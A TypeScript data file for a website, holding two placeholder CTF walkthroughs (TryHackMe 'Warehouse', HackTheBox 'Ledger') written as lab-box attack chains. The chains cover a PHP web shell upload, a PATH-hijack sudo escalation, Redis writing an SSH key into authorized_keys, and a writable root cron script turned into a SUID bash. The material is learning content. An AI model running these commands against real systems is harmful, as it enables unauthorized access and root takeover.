// Placeholder machine writeup used to design the layout for this section.
// Real content (condensed from raw enum/exploit/privesc notes) will replace
// this once that conversion work happens.

export type MachinePhase = {
  title: string;
  body: string;
};

export type Machine = {
  slug: string;
  name: string;
  platform: "HackTheBox" | "TryHackMe";
  difficulty: "Easy" | "Medium" | "Hard";
  os: "Linux" | "Windows";
  date: string;
  tags: string[];
  summary: string;
  phases: MachinePhase[];
};

export const machines: Machine[] = [
  {
    slug: "warehouse",
    name: "Warehouse",
    platform: "TryHackMe",
    difficulty: "Easy",
    os: "Linux",
    date: "2026-02-14",
    tags: ["nmap", "cms", "cve", "sudo-misconfig"],
    summary:
      "An easy Linux box built around an outdated inventory CMS, ending in a straightforward sudo privilege escalation. Placeholder writeup used to design this section's layout.",
    phases: [
      {
        title: "Recon",
        body: `A standard full-port scan turns up two services worth chasing.

\`\`\`shell
$ nmap -p- -T4 10.10.94.21
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
\`\`\`

Service and default script scan against the open ports:

\`\`\`shell
$ nmap -p 22,80 -sC -sV 10.10.94.21
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Apache httpd 2.4.41
| http-title: Warehouse Inventory &mdash; Login
\`\`\`

A directory scan against port 80 surfaces an admin panel and a version
string in the page footer that points at a known-vulnerable CMS release.

\`\`\`shell
$ gobuster dir -u http://10.10.94.21 -w common.txt -x php
/admin                (Status: 301)
/uploads               (Status: 301)
/CHANGELOG.md          (Status: 200)
\`\`\`
`,
      },
      {
        title: "Foothold",
        body: `The changelog confirms the CMS version, which has a public
authenticated file-upload vulnerability (arbitrary PHP upload via the
inventory image field). Default credentials from the vendor docs
(\`admin:admin\`) still work.

Upload a minimal PHP web shell disguised with a double extension to slip
past the extension check, then trigger it directly:

\`\`\`shell
$ curl -F "image=@shell.php.jpg" http://10.10.94.21/admin/upload.php
$ curl "http://10.10.94.21/uploads/shell.php.jpg?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
\`\`\`

Upgrade to a proper shell and grab the user flag from
\`/home/warehouse/user.txt\`.`,
      },
      {
        title: "Privilege escalation",
        body: `\`sudo -l\` as \`www-data\` shows a maintenance script that can be
run as root without a password:

\`\`\`shell
$ sudo -l
(root) NOPASSWD: /opt/warehouse/scripts/backup.sh
\`\`\`

The script shells out to \`tar\` without an absolute path, so a
\`PATH\`-hijacked \`tar\` binary gets executed as root:

\`\`\`shell
$ echo '/bin/bash' > /tmp/tar && chmod +x /tmp/tar
$ sudo PATH=/tmp:$PATH /opt/warehouse/scripts/backup.sh
# whoami
root
\`\`\`
`,
      },
      {
        title: "Loot",
        body: `**User flag:** \`THM{placeholder_user_flag_warehouse}\`

**Root flag:** \`THM{placeholder_root_flag_warehouse}\`
`,
      },
    ],
  },
  {
    slug: "ledger",
    name: "Ledger",
    platform: "HackTheBox",
    difficulty: "Easy",
    os: "Linux",
    date: "2026-03-02",
    tags: ["redis", "ssh-keys", "cron"],
    summary:
      "An easy Linux box with an unauthenticated Redis instance that's abused to plant an SSH key, then a root cron job that finishes the job. Placeholder writeup used to design this section's layout.",
    phases: [
      {
        title: "Recon",
        body: `\`\`\`shell
$ nmap -p- -T4 10.10.71.9
PORT     STATE SERVICE
22/tcp   open  ssh
6379/tcp open  redis
\`\`\`

Redis with no auth configured:

\`\`\`shell
$ redis-cli -h 10.10.71.9 ping
PONG
$ redis-cli -h 10.10.71.9 config get requirepass
1) "requirepass"
2) ""
\`\`\`

An open, unauthenticated Redis instance is enough on its own &mdash; the
next step is turning read/write access into code execution.`,
      },
      {
        title: "Foothold",
        body: `Redis can write arbitrary files, so the standard move is to write an
SSH public key into a user's \`authorized_keys\`:

\`\`\`shell
$ (echo -e "\\n\\n"; cat id_rsa.pub; echo -e "\\n\\n") > key.txt
$ redis-cli -h 10.10.71.9 flushall
$ cat key.txt | redis-cli -h 10.10.71.9 -x set ssh_key
$ redis-cli -h 10.10.71.9 config set dir /home/ledger/.ssh
$ redis-cli -h 10.10.71.9 config set dbfilename authorized_keys
$ redis-cli -h 10.10.71.9 save
\`\`\`

\`\`\`shell
$ ssh -i id_rsa ledger@10.10.71.9
ledger@ledger:~$ id
uid=1000(ledger) gid=1000(ledger) groups=1000(ledger)
\`\`\`

Grab the user flag from \`/home/ledger/user.txt\`.`,
      },
      {
        title: "Privilege escalation",
        body: `\`/etc/crontab\` is world-readable and shows a root cron job running a
script the \`ledger\` user can write to:

\`\`\`shell
$ cat /etc/crontab
* * * * * root /opt/ledger/sync.sh
$ ls -la /opt/ledger/sync.sh
-rwxrwxr-x 1 root ledger /opt/ledger/sync.sh
\`\`\`

Append a reverse shell (or SUID bash copy) to the script and wait for the
next minute's run:

\`\`\`shell
$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/ledger/sync.sh
$ sleep 60 && /tmp/rootbash -p
rootbash-5.1# whoami
root
\`\`\`
`,
      },
      {
        title: "Loot",
        body: `**User flag:** \`HTB{placeholder_user_flag_ledger}\`

**Root flag:** \`HTB{placeholder_root_flag_ledger}\`
`,
      },
    ],
  },
];

export function getMachine(slug: string): Machine | undefined {
  return machines.find((m) => m.slug === slug);
}

export function machinesByPlatform(platform: Machine["platform"]): Machine[] {
  return machines.filter((m) => m.platform === platform);
}
